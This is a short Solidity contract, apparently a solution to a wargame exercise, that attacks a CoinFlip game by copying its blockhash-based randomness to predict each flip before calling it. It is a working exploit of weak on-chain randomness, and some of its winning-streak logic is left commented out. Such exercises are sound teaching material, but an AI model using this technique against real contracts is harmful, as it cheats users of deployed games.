// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.9.0;

import './CoinFlip.sol';
import '@openzeppelin/contracts/math/SafeMath.sol';

contract ExoThree {

  using SafeMath for uint256;
  CoinFlip coinFlip;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  uint256 public consecutiveWins;

  constructor(address gameAddress) public {
    consecutiveWins = 0;
    coinFlip = CoinFlip(gameAddress);
    
  }

  function win() public returns( bool){
    if(consecutiveWins > 10) { return true;}
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 coinFlipValue = blockValue.div(FACTOR);
    bool side = coinFlipValue == 1 ? true : false;
    bool result = coinFlip.flip(side);
    return result;
    // if (result && consecutiveWins <= 10) {
    //   consecutiveWins++;
    //   this.win();
    // } else {
    //   return false;
    // }
  }
}
